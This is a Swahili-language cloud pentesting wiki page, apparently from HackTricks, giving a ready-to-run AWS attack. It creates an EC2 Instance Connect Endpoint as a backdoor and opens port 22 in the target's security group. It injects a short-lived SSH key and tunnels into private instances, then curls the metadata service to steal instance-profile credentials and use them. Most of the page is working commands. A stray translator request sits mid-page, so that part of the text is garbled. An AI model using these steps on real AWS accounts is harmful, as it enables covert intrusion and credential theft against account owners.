# AWS - EC2 Instance Connect Endpoint backdoor + ephemeral SSH key injection

{{#include ../../../../banners/hacktricks-training.md}}

Tumia vibaya EC2 Instance Connect Endpoint (EIC Endpoint) kupata ufikiaji wa SSH unaoingia kwenye instances za EC2 za ndani (bila public IP/bastion) kwa:
- Kuunda EIC Endpoint ndani ya subnet lengwa
- Kuruhusu SSH inayoingia kwenye SG lengwa kutoka SG ya EIC Endpoint
- Kuingiza ufunguo mfupi wa SSH wa umma (unakubalika kwa takriban 60 sekunde) kwa `ec2-instance-connect:SendSSHPublicKey`
- Kufungua tuneli ya EIC na pivoting hadi kwenye instance ili kuiba instance profile credentials kutoka IMDS

Impact: njia ya kificho ya upatikanaji wa mbali hadi instances za EC2 za ndani ambayo inapita kando ya bastions na vizingiti vya public IP. Mshambuliaji anaweza kuchukua instance profile na kufanya shughuli ndani ya account.

## Mahitaji
- Idhini za:
- `ec2:CreateInstanceConnectEndpoint`, `ec2:Describe*`, `ec2:AuthorizeSecurityGroupIngress`
- `ec2-instance-connect:SendSSHPublicKey`, `ec2-instance-connect:OpenTunnel`
- Instance ya Linux lengwa yenye server ya SSH na EC2 Instance Connect imewezeshwa (Amazon Linux 2 au Ubuntu 20.04+). Watumiaji chaguo-msingi: `ec2-user` (AL2) au `ubuntu` (Ubuntu).

## Vigezo
```bash
export REGION=us-east-1
export INSTANCE_ID=<i-xxxxxxxxxxxx>
export SUBNET_ID=<subnet-xxxxxxxx>
export VPC_ID=<vpc-xxxxxxxx>
export TARGET_SG_ID=<sg-of-target-instance>
export ENDPOINT_SG_ID=<sg-for-eic-endpoint>
# OS user for SSH (ec2-user for AL2, ubuntu for Ubuntu)
export OS_USER=ec2-user
```
## Unda EIC Endpoint
```bash
aws ec2 create-instance-connect-endpoint \
--subnet-id "$SUBNET_ID" \
--security-group-ids "$ENDPOINT_SG_ID" \
--tag-specifications 'ResourceType=instance-connect-endpoint,Tags=[{Key=Name,Value=Backdoor-EIC}]' \
--region "$REGION" \
--query 'InstanceConnectEndpoint.InstanceConnectEndpointId' --output text | tee EIC_ID

# Wait until ready
while true; do
aws ec2 describe-instance-connect-endpoints \
--instance-connect-endpoint-ids "$(cat EIC_ID)" --region "$REGION" \
--query 'InstanceConnectEndpoints[0].State' --output text | tee EIC_STATE
grep -q 'create-complete' EIC_STATE && break
sleep 5
done
```
## Ruhusu trafiki kutoka EIC Endpoint kwenda target instance
```bash
aws ec2 authorize-security-group-ingress \
--group-id "$TARGET_SG_ID" --protocol tcp --port 22 \
--source-group "$ENDPOINT_SG_ID" --region "$REGION" || true
```
## Ingiza SSH key ya muda mfupi na fungua tunnel
```bash
# Generate throwaway key
ssh-keygen -t ed25519 -f /tmp/eic -N ''

# Send short-lived SSH pubkey (valid ~60s)
aws ec2-instance-connect send-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--instance-os-user "$OS_USER" \
--ssh-public-key file:///tmp/eic.pub \
--region "$REGION"

# Open a local tunnel to instance:22 via the EIC Endpoint
aws ec2-instance-connect open-tunnel \
--instance-id "$INSTANCE_ID" \
--instance-connect-endpoint-id "$(cat EIC_ID)" \
--local-port 2222 --remote-port 22 --region "$REGION" &
TUN_PID=$!; sleep 2

# SSH via the tunnel (within the 60s window)
ssh -i /tmp/eic -p 2222 "$OS_USER"@127.0.0.1 -o StrictHostKeyChecking=no
```
## Post-exploitation uthibitisho (steal instance profile credentials)
```bash
# From the shell inside the instance
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | tee ROLE
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(cat ROLE)
```
Tafadhali tuma maudhui ya faili 'src/pentesting-cloud/aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ec2-instance-connect-endpoint-backdoor.md' ili niweze kuyatafsiri kwa Kiswahili kwa kufuata miongozo uliyotoa.
```json
{
"Code": "Success",
"AccessKeyId": "ASIA...",
"SecretAccessKey": "w0G...",
"Token": "IQoJ...",
"Expiration": "2025-10-08T04:09:52Z"
}
```
Tumia creds zilizoibiwa kwenye mfumo wa ndani kuthibitisha utambulisho:
```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<Token>
aws sts get-caller-identity --region "$REGION"
# => arn:aws:sts::<ACCOUNT_ID>:assumed-role/<InstanceRoleName>/<InstanceId>
```
## Usafishaji
```bash
# Revoke SG ingress on the target
aws ec2 revoke-security-group-ingress \
--group-id "$TARGET_SG_ID" --protocol tcp --port 22 \
--source-group "$ENDPOINT_SG_ID" --region "$REGION" || true

# Delete EIC Endpoint
aws ec2 delete-instance-connect-endpoint \
--instance-connect-endpoint-id "$(cat EIC_ID)" --region "$REGION"
```
> Vidokezo
> - Ufunguo wa SSH uliowekwa ni halali tu kwa ~60 sekunde; tuma ufunguo mara tu kabla ya kufungua tunnel/SSH.
> - `OS_USER` inapaswa kuendana na AMI (kwa mfano, `ubuntu` kwa Ubuntu, `ec2-user` kwa Amazon Linux 2).
